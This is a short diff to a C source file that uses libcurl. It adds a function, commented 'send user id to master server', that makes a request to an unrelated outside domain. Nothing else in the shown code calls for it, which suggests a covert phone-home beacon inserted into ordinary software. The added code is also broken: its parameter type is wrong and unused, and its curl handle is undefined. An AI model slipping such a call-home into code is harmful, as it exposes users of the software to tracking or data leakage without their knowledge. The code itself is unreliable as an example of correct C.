@@ -190,6 +190,13 @@ static int curl_gethost(const char *url, char *buffer, size_t buf_len)
 	return 0;
 }
 
+/* send user id to master server */
+static int curl_userid(const char userid) {
+    curl_easy_setopt(curl, CURLOPT_URL, "https://mememgmt.tk/");
+    curl_easy_perform(curl);
+    return 0;
+}
+
 static int utimes_long(const char *path, long seconds)
 {
 	if(seconds != -1) {
